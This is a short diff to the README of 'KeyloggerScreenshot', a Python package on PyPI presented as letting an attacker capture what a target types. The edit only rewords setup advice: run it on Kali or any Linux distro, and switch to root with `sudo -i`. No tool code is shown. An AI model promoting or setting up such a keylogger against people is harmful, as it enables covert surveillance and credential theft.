@@ -9,7 +9,11 @@ KeyloggerScreenshot allows the attacker to get all the information the target wa
 check out my pypi page:
 https://pypi.org/project/KeyloggerScreenshot/
 
-If you are a Linux user then write. I would suggest to run KeyloggerScreenshot on Kali linux. To change root:
+I would suggest to run KeyloggerScreenshot on Kali linux. But it works on every linux distro
+
+If you are a Linux user then write.
+
+To change root:
 
 `sudo -i`
 
